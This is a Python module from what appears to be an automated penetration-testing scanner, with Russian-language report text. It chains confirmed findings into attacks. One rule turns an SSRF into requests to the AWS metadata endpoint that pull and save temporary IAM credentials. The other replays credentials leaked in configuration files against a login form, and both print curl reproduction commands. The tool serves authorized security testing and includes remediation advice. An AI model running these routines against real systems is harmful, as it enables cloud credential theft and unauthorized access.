"""Attack-path chain correlation.

Runs *after* adaptive confirmation, over the now-finalized findings in the
store. Where a human pentester would look at two confirmed findings and think
"wait, these compose into something much worse" (SSRF that reaches cloud
metadata + that metadata returns real keys; a leaked password + a login form
that accepts it), this module performs **one** additional materialization step
to either prove the chain for real or stay silent. A chain only becomes a new
`Finding` when something genuinely new was extracted — restating the base
finding under a scarier title would just be noise.
"""
from __future__ import annotations
import re
import uuid
from pathlib import Path
from urllib.parse import urlparse, urlunparse, parse_qsl, urlencode

import requests

from . import adaptive
from .findings import Finding, FindingStore, Severity
from .checks.ratelimit import LOGIN_PATHS


# ── Generic param-replay (chain rules run after Candidate.context closures are
#    gone — probes are reconstructed from Finding.url / Finding.parameter) ────

def _replay_url(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    query = dict(parse_qsl(parsed.query, keep_blank_values=True))
    query[param] = value
    return urlunparse(parsed._replace(query=urlencode(query)))


def _replay_with_param(session: requests.Session, url: str, param: str, value: str,
                        timeout: int = 10):
    try:
        return session.get(_replay_url(url, param, value), timeout=timeout, allow_redirects=False)
    except Exception:
        return None


# ── Rule 1: SSRF → cloud metadata → stolen temporary credentials ─────────────

_CLOUD_METADATA_RE = re.compile(
    r"(aws metadata|azure metadata|gcp metadata|169\.254\.169\.254|metadata\.google\.internal)",
    re.IGNORECASE,
)

_AWS_ROLE_LIST_URL = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
_ROLE_NAME_RE = re.compile(r"^([\w.\-]{1,128})\s*$")

_CLOUD_CREDENTIAL_SIGNATURES: list[tuple[str, str]] = [
    (r'"AccessKeyId"\s*:\s*"([^"]+)"', "AWS AccessKeyId"),
    (r'"SecretAccessKey"\s*:\s*"([^"]+)"', "AWS SecretAccessKey"),
    (r'"Token"\s*:\s*"([A-Za-z0-9/+=]{20,})"', "AWS Session Token"),
    (r'"access_token"\s*:\s*"([^"]+)"', "OAuth/cloud access_token"),
]


def _scan_for_cloud_credentials(text: str) -> list[tuple[str, str]]:
    hits = []
    for pattern, label in _CLOUD_CREDENTIAL_SIGNATURES:
        m = re.search(pattern, text)
        if m:
            hits.append((label, m.group(0)[:200]))
    return hits


def _chain_ssrf_to_cloud_credentials(session, base_url, store, endpoints, artifact_root,
                                      *, deep_dive, active_exploit, verbose=False) -> None:
    if not deep_dive:
        return

    for finding in store.all():
        if finding.kind != "ssrf" or finding.status != "confirmed-deep-dive":
            continue
        if not finding.url or not finding.parameter:
            continue
        if not _CLOUD_METADATA_RE.search(f"{finding.description}\n{finding.evidence}"):
            continue

        role_resp = _replay_with_param(session, finding.url, finding.parameter, _AWS_ROLE_LIST_URL)
        if role_resp is None or role_resp.status_code >= 400 or not role_resp.text.strip():
            continue

        creds_text = role_resp.text
        role_name = None
        first_line = role_resp.text.strip().splitlines()[0].strip()
        role_match = _ROLE_NAME_RE.match(first_line)
        if role_match:
            role_name = role_match.group(1)
            creds_resp = _replay_with_param(session, finding.url, finding.parameter,
                                             _AWS_ROLE_LIST_URL + role_name)
            if creds_resp is not None and creds_resp.text.strip():
                creds_text = creds_resp.text

        hits = _scan_for_cloud_credentials(creds_text)
        if not hits:
            continue

        rel_path = adaptive._dump_artifact(
            artifact_root, finding.id, f"cloud_credentials_{finding.id}.json", creds_text[:8000]
        )
        target_desc = _AWS_ROLE_LIST_URL + (role_name or "")
        chain = Finding(
            title="Цепочка: SSRF → кража временных облачных учётных данных",
            severity=Severity.CRITICAL,
            description=(
                f"Базовая находка SSRF [{finding.id}] «{finding.title}» позволяет серверу "
                "выполнять исходящие HTTP-запросы по адресу из параметра. Использование этой "
                f"возможности для запроса IAM-метаданных облака ({target_desc}) вернуло "
                "содержимое с распознаваемыми реальными учётными данными:\n"
                + "\n".join(f"  - {label}: {snippet}" for label, snippet in hits) + "\n\n"
                "Это превращает теоретически опасный SSRF в подтверждённую кражу ключей "
                "доступа к облачной инфраструктуре цели — с ними возможен полноценный "
                "доступ к ресурсам аккаунта от имени скомпрометированной IAM-роли."
            ),
            url=finding.url,
            remediation=(
                f"1. Устраните SSRF в параметре '{finding.parameter}' (см. рекомендации находки [{finding.id}]).\n"
                "2. Заблокируйте доступ workload'ов к 169.254.169.254 на сетевом уровне "
                "(iptables/security groups) или перейдите на IMDSv2 с обязательным токеном.\n"
                "3. Немедленно отзовите/ротируйте скомпрометированные временные учётные данные "
                "и проведите аудит активности соответствующей IAM-роли в CloudTrail."
            ),
            reproduction=(
                f"# Подмена параметра '{finding.parameter}' адресом метаданных облака:\n"
                f"curl -s '{_replay_url(finding.url, finding.parameter, target_desc)}'"
            ),
            evidence=f"Извлечённые учётные данные сохранены в артефакт: {rel_path}",
            parameter=finding.parameter,
            category="Attack Chain",
            cwe="CWE-918",
            status="confirmed-deep-dive",
            confidence=1.0,
            kind="chain",
            verification_log=[
                f"CONFIRMED (chain): повторная отправка SSRF-payload [{finding.id}] с адресом "
                f"метаданных IAM ({target_desc}) вернула содержимое с сигнатурами реальных "
                f"облачных учётных данных ({', '.join(label for label, _ in hits)})"
            ],
            artifacts=[rel_path],
        )
        store.add(chain)
        print(f"  [+] CONFIRMED: {chain.title}")


# ── Rule 2: leaked credentials → successful login ────────────────────────────
# Performs a real authentication attempt — gated on `active_exploit`
# (aggressive only), same philosophy as `run_sqlmap`.

_USERNAME_RE = re.compile(r"(?im)^\s*(?:DB_USER(?:NAME)?|ADMIN_USER(?:NAME)?|APP_USER|USERNAME|LOGIN)\s*=\s*[\"']?([^\s\"']+)")
_PASSWORD_RE = re.compile(r"(?im)^\s*(?:DB_PASSWORD|ADMIN_PASS(?:WORD)?|APP_PASSWORD|PASSWORD|SECRET)\s*=\s*[\"']?([^\s\"']+)")

_USERNAME_KEY_RE = re.compile(r"(user(?:name)?|login|email)", re.IGNORECASE)
_PASSWORD_KEY_RE = re.compile(r"(pass(?:word)?|pwd|secret)", re.IGNORECASE)


def _extract_credential_pair(text: str):
    user_match = _USERNAME_RE.search(text)
    pass_match = _PASSWORD_RE.search(text)
    if user_match and pass_match:
        return user_match.group(1), pass_match.group(1)
    return None


def _find_login_surface(endpoints):
    """Returns (endpoint, username_field, password_field) or None."""
    for ep in endpoints:
        if ep.method.upper() != "POST":
            continue
        keys = list(dict(ep.body_params or ep.params))
        user_key = next((k for k in keys if _USERNAME_KEY_RE.search(k)), None)
        pass_key = next((k for k in keys if _PASSWORD_KEY_RE.search(k)), None)
        if user_key and pass_key:
            return ep, user_key, pass_key
    for ep in endpoints:
        if ep.method.upper() == "POST" and any(ep.parsed.path.rstrip("/").endswith(p) for p in LOGIN_PATHS):
            return ep, "username", "password"
    return None


def _chain_leaked_credentials_to_login(session, base_url, store, endpoints, artifact_root,
                                        *, deep_dive, active_exploit, verbose=False) -> None:
    if not active_exploit:
        return

    surface = _find_login_surface(endpoints)
    if surface is None:
        return
    login_ep, user_key, pass_key = surface

    for finding in store.all():
        if finding.kind != "disclosure" or finding.status != "confirmed-deep-dive" or not finding.artifacts:
            continue

        pair = None
        for rel_path in finding.artifacts:
            try:
                text = (artifact_root.parent / rel_path).read_text(encoding="utf-8", errors="replace")
            except OSError:
                continue
            pair = _extract_credential_pair(text)
            if pair:
                break
        if pair is None:
            continue
        username, password = pair

        try:
            real_resp = session.post(login_ep.url, data={user_key: username, pass_key: password},
                                      timeout=10, allow_redirects=True)
            control_resp = session.post(
                login_ep.url,
                data={user_key: f"__vsw_{uuid.uuid4().hex[:6]}", pass_key: uuid.uuid4().hex},
                timeout=10, allow_redirects=True,
            )
        except Exception as e:
            if verbose:
                print(f"  [?] цепочка leaked-creds→login: запрос не удался: {e}")
            continue

        real_markers = set(adaptive._ADMIN_MARKERS.findall(real_resp.text))
        control_markers = set(adaptive._ADMIN_MARKERS.findall(control_resp.text))
        new_markers = real_markers - control_markers
        status_diverged = (real_resp.status_code in (200, 301, 302)
                           and control_resp.status_code not in (200, 301, 302)
                           and real_resp.status_code != control_resp.status_code)
        if not new_markers and not status_diverged:
            continue

        proof = (
            f"Login URL: {login_ep.url}\nUsername: {username}\nPassword: {password}\n\n"
            f"--- Ответ на похищенную пару (HTTP {real_resp.status_code}) ---\n{real_resp.text[:3000]}\n\n"
            f"--- Контрольный ответ на заведомо неверную пару (HTTP {control_resp.status_code}) ---\n"
            f"{control_resp.text[:1000]}"
        )
        rel_path = adaptive._dump_artifact(artifact_root, finding.id, f"login_proof_{finding.id}.txt", proof)

        signal = (", ".join(sorted(new_markers))
                  if new_markers else f"HTTP {real_resp.status_code} вместо {control_resp.status_code} у контроля")
        chain = Finding(
            title="Цепочка: утечка учётных данных → успешный вход в систему",
            severity=Severity.CRITICAL,
            description=(
                f"Базовая находка раскрытия информации [{finding.id}] «{finding.title}» содержала "
                f"пару учётных данных ({username}:***). Использование этой пары для входа на "
                f"{login_ep.url} прошло успешно — ответ содержит признаки авторизованной сессии "
                f"({signal}), отсутствующие в ответе на заведомо неверную (контрольную) пару. "
                "Это превращает утечку конфигурации в подтверждённый несанкционированный доступ к системе."
            ),
            url=login_ep.url,
            remediation=(
                "1. Немедленно смените скомпрометированные учётные данные и проведите аудит "
                "активности под этой учётной записью.\n"
                f"2. Устраните источник утечки (см. рекомендации находки [{finding.id}]).\n"
                "3. Включите многофакторную аутентификацию для административных учётных записей."
            ),
            reproduction=(
                f"curl -s -X POST '{login_ep.url}' "
                f"--data '{user_key}={username}&{pass_key}=<пароль из артефакта {rel_path}>'"
            ),
            evidence=f"Доказательство успешного входа сохранено: {rel_path}",
            parameter=user_key,
            method="POST",
            category="Attack Chain",
            cwe="CWE-522",
            status="confirmed-deep-dive",
            confidence=1.0,
            kind="chain",
            verification_log=[
                f"CONFIRMED (chain): пара учётных данных из находки [{finding.id}] прошла "
                f"дифференциальную проверку входа на {login_ep.url} — успешный ответ содержит "
                "маркеры/код состояния, отсутствующие в ответе на контрольную (заведомо неверную) пару"
            ],
            artifacts=[rel_path],
        )
        store.add(chain)
        print(f"  [+] CONFIRMED: {chain.title}")
        return


CHAIN_RULES = [
    _chain_ssrf_to_cloud_credentials,
    _chain_leaked_credentials_to_login,
]


def run_chain_analysis(session: requests.Session, base_url: str, store: FindingStore,
                       endpoints: list, artifact_root: Path,
                       deep_dive: bool, active_exploit: bool, verbose: bool = False) -> None:
    before = len(store)
    for rule in CHAIN_RULES:
        try:
            rule(session, base_url, store, endpoints, artifact_root,
                 deep_dive=deep_dive, active_exploit=active_exploit, verbose=verbose)
        except Exception as e:
            print(f"  [!] анализ цепочек ({rule.__name__}): {e}")
            if verbose:
                import traceback
                traceback.print_exc()

    built = len(store) - before
    if built:
        print(f"[+] Анализ цепочек атак завершён: построено и подтверждено цепочек — {built}")
    else:
        print("[+] Анализ цепочек атак завершён: подтверждённых цепочек не найдено")
